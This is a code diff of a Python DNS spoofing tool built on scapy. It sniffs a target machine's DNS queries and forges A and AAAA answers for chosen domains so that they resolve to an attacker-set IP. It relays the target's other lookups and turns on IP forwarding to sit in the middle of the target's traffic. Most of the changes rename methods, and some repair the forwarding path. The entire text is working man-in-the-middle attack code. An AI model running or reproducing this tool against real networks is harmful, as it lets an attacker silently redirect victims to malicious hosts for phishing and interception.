@@ -21,13 +21,13 @@ class DNSSpoofer:
         self.new_dns_ip6 = new_dns_ip6 if new_dns_ip6 else get_if_addr6(interface)
 
 
-    def isSupportedType(self, id: int) -> bool:
+    def is_supported_type(self, id: int) -> bool:
         return (
             (id == 1 and self.new_dns_ip) or    # A
             (id == 28 and self.new_dns_ip6)     # AAAA
         )
 
-    def recordTypeIdToName(self, id: int) -> str:
+    def record_type_id_to_name(self, id: int) -> str:
         """
         Convert type ID to name for readability
         For now, only common onces are included
@@ -48,25 +48,25 @@ class DNSSpoofer:
         else:
             return str(id)
 
-    def isIncoming(self, pkt: Packet) -> bool:
+    def is_incoming(self, pkt: Packet) -> bool:
         """Filter to check, whether a packet is (supposedly) incoming, and not from this interface"""
         if Ether in pkt:
             return pkt[Ether].src == get_if_hwaddr(self.interface)
         else:
             return False
     
-    def isDNS(self, pkt: Packet) -> bool:
+    def is_dns(self, pkt: Packet) -> bool:
         """Does what it says, used as filter for the sniffer. Note that we only check for UDP DNS"""
         return DNS in pkt and UDP in pkt
 
-    def isFromTarget(self, pkt: Packet) -> bool:
+    def is_from_target(self, pkt: Packet) -> bool:
         """Filter to check, whether a packet is (supposedly) from the target"""
         if IP in pkt:
             return pkt[IP].src == self.target_ip
         else:
             return False
 
-    def isTargetDomain(self, pkt: Packet) -> bool:
+    def is_target_domain(self, pkt: Packet) -> bool:
         if DNS in pkt:
             for i in range(int(pkt[DNS].qdcount)):
                 name = str(pkt[DNS].qd[i].qname)
@@ -92,11 +92,11 @@ class DNSSpoofer:
         if recordType == 1:
             # type: A
             res_pkt /= DNS(id=req_pkt[DNS].id, qd=DNSQR(qname=name, qtype=recordType), an=DNSRR(rrname=name, type=recordType, ttl=30, rdata=self.new_dns_ip), qr=1)
-            print(f'Sending back response to {req_pkt[IP].src} with {self.recordTypeIdToName(recordType)} record: {self.new_dns_ip}')
+            print(f'Sending back response to {req_pkt[IP].src} with {self.record_type_id_to_name(recordType)} record: {self.new_dns_ip}')
         elif recordType == 28:
             # type: AAAA
             res_pkt /= DNS(id=req_pkt[DNS].id, qd=DNSQR(qname=name, qtype=recordType), an=DNSRR(rrname=name, type=recordType, ttl=30, rdata=self.new_dns_ip6), qr=1)
-            print(f'Sending back response to {req_pkt[IP].src} with {self.recordTypeIdToName(recordType)} record: {self.new_dns_ip6}')
+            print(f'Sending back response to {req_pkt[IP].src} with {self.record_type_id_to_name(recordType)} record: {self.new_dns_ip6}')
 
 
         return res_pkt
@@ -108,19 +108,19 @@ class DNSSpoofer:
                 # qdcount = the number of requested records
                 name = pkt[DNS].qd[i].qname
                 recordType = pkt[DNS].qd[i].qtype
-                print(f'Received DNS request from {pkt[IP].src} for {name} of type {self.recordTypeIdToName(recordType)}')
-                if self.isSupportedType(recordType):
+                print(f'Received DNS request from {pkt[IP].src} for {name} of type {self.record_type_id_to_name(recordType)}')
+                if self.is_supported_type(recordType):
                     res_pkt = self.get_spoof_packet(pkt, name, recordType)
                     send(res_pkt, iface=self.interface, verbose=False)
                 else:
                     print('Type not supported, ignoring...')
 
     def handle_dns_packet(self, pkt: Packet) -> None:
-        if self.isFromTarget(pkt) and self.isTargetDomain(pkt) and not self.is_to_attacker(pkt):
+        if self.is_from_target(pkt) and self.is_target_domain(pkt) and not self.is_to_attacker(pkt):
             # Is from targeted machine, and is a request for targeted domain
             print(f'Spoof DNS request for: {str(pkt[DNSQR].qname)}, to {pkt[IP].dst}, from {pkt[IP].src}')
             self.spoof_dns_request(pkt)
-        elif not int(pkt[DNS].ancount) > 0 and not self.isIncoming(pkt):
+        elif pkt[DNS].ancount == 0 and pkt[DNS].opcode == 0 and self.is_from_target(pkt):
             # Any other DNS request, get the real response from Google first
             print(f'Forward DNS request for: {str(pkt[DNSQR].qname)}, to {pkt[IP].dst}, from {pkt[IP].src}')
             spoofed_req: Packet = (
@@ -129,14 +129,14 @@ class DNSSpoofer:
                 DNS()
             )
 
-            #spoofed_req[DNS].rd = 1
-            #spoofed_req[DNS].id = pkt[DNS].id
-            #spoofed_req[DNS].qd = DNSQR(qname=pkt[DNSQR].qname)
-            spoofed_req[DNS] = pkt[DNS]
+            spoofed_req[DNS].id = pkt[DNS].id
+            spoofed_req[DNS].qd = DNSQR(qname=pkt[DNSQR].qname)
+            spoofed_req[DNS].rd = 1
 
-            real_res: Packet = sr1(spoofed_req, inter=1, retry=3, timeout=1)
+            real_res: Packet = sr1(spoofed_req, inter=1, retry=3, timeout=1, verbose=True)
 
             if real_res and DNS in real_res:
+                print(f'Got back response for {str(pkt[DNSQR].qname)}')
                 spoofed_res: Packet = (
                     IP(dst=pkt[IP].src, src=real_res[IP].src) /
                     UDP(dport=pkt[UDP].sport) /
@@ -145,15 +145,9 @@ class DNSSpoofer:
 
                 spoofed_res[DNS] = real_res[DNS]
 
-                #forward_pkt: Packet = (
-                #    IP(src=pkt[IP].src, dst=pkt[IP].dst) /
-                #    UDP(sport=pkt[UDP].sport, dport=pkt[UDP].dport) /
-                #    DNS()
-                #)
-
-                #forward_pkt[DNS] = pkt[DNS]
-                #print(forward_pkt)
-                send(spoofed_res, iface=self.interface, verbose=True)
+                send(spoofed_res, iface=self.interface, verbose=False)
+            else:
+                print(f'No response for {str(pkt[DNSQR].qname)}')
 
     def set_packet_forwarding(self, value: bool) -> None:
         """This function turns on or turns off IP (packet) forwarding depending on the value given"""
@@ -165,7 +159,7 @@ class DNSSpoofer:
     
     def start(self) -> None:
         """Start an asynchronous sniffer, use the stop() method to stop this"""
-        self.sniffer = AsyncSniffer(iface=self.interface, prn=self.handle_dns_packet, lfilter=self.isDNS, store=False)
+        self.sniffer = AsyncSniffer(iface=self.interface, prn=self.handle_dns_packet, lfilter=self.is_dns, store=False)
         self.sniffer.start()
         self.set_packet_forwarding(True)
         print("DNS spoofing started")
